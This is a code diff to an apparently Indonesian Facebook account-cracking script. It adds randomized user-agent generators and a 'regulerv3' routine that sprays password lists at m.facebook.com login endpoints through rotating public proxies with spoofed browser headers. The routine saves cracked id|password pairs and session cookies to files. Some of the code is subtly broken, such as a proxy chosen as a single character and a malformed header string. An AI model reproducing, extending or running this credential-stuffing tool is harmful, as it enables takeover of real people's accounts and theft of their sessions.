@@ -107,7 +107,31 @@ for i in range(200):
 	N = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
 	G = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-G973F/G973FXXSEFUL1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
 	rudalt= random.choice([S,A,M,S,U,N,G])
-	ugen.append(rudalt)
+	ugent.append(rudalt)
+#----------[ USER-AGENT ]----------#  
+ugen=[]
+realme = random.choice(["RMX2072","RMX2086","RMX3350"])
+for Xr in range (10000):	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Build/'
+	e=random.choice(["MMB29T","JZO54K","M1AJQ","KOT49H"])
+	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	g=random.randrange(73,112)
+	h='0'
+	i=random.randrange(4200,4900)
+	j=random.randrange(40,150)
+	k='Mobile Safari/534.36'
+	l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge"])
+	#l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
+	m=random.randrange(1,9)
+	n=random.randrange(1,9)
+	o='0'
+	p=random.randrange(5,20)
+	uaku=(f'{a} {b}.{c}; {realme}) {d}{e}; wv) {f}{g}.{h}.{i}.{j} {k} {l}/{m}.{n}.{o}.{p}')
+	ugen.append(uaku)
+
 
 for khontol in range(9999):
 	rc = random.choice; rr = random.randint
@@ -157,7 +181,7 @@ for xd in range(10000):
     strvnokiax = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
     strvgt = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
     uateddy = random.choice([strvredmi, strvsamsung, strvgt])
-    ugen.append(uateddy)
+    free.append(uateddy)
 
 ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
@@ -1312,11 +1336,11 @@ def passwrd():
                 if 'reguler' in method:
                     pool.submit(reguler,idf,pwv)
                 elif 'mbasic' in method:
-                    pool.submit(regulerv2,idf,pwv,'m.facebook.com')
+                    pool.submit(regulerv3,idf,pwv,'m.facebook.com')
                 elif 'validate' in method:
                     pool.submit(mbasic,idf,pwv)
                 else:
-                    pool.submit(regulerv2,idf,pwv,'m.facebook.com')
+                    pool.submit(regulerv3,idf,pwv,'m.facebook.com')
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
@@ -1328,6 +1352,88 @@ def passwrd():
         Console().print(f"[bold green]	\n[bold yellow]God Bye Kawan")
         time.sleep(1)
         exit()
+
+
+def regulerv3(idf,pwv,url):
+	global loop,ok,cp
+	rr = random.randint
+	rc = random.choice
+	prog.update(des,description=f'\r[bold white]Reguler V3[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
+	prog.advance(des)
+	ua = rc(ugen)
+	ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
+	ses = requests.Session()
+	for pw in pwv:
+		pw = pw.lower()
+		try:
+			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+			nip = rc(proxs)
+			proxs = {'http': 'socks4://'+nip}
+			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
+			'had_cp_prefilled': 'false',
+			'had_password_prefilled': 'false',
+			'is_smart_lock': 'true',
+			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+			"__dyn": "",
+			"__csr": "",
+			"__req": rc(["1","2","3","4","5","6","7","8","9","0"]),
+			"__a": "",
+			"__user": "0",
+			"_fb_noscript": "true"}
+			head = {"Host": url,
+			"content-length": f"{len(str(date))}",
+			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
+			"sec-ch-ua-mobile": "?1",
+			"user-agent": ua,
+			"viewport-width": f"str(rr(400,989)",
+			"content-type": "application/x-www-form-urlencoded",
+			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
+			"x-asbd-id": "129477",
+			"x-requested-with": "mark.via.gp",
+			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
+			"sec-ch-prefers-color-scheme": "light",
+			"sec-ch-ua-platform": '"Android"',
+			"accept": "*/*",
+			"origin": "https://"+url,
+			"sec-fetch-site": "same-origin",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-dest": "empty",
+			"referer": f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+			"accept-encoding": "gzip, deflate, br",
+			"accept-language": "zh-CN;q=0.8,zh;q=0.9",
+			"x-response-format": "JSONStream"}
+			#po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
+			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				cp+=1
+				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
+				prints(tree)
+				os.popen('play-audio c.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				ceker(idf,pwv)
+				akun.append(idf+'|'+pw)
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
+				prints(tree)
+				os.popen('play-audio o.mp3')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				cek_apk(kuki)
+				break
+			else:continue
+		except requests.exceptions.ConnectionError:time.sleep(31)
+	loop+=1
+
+
 
 def regulerv2(idf,pwv,url):
 	global loop,ok,cp
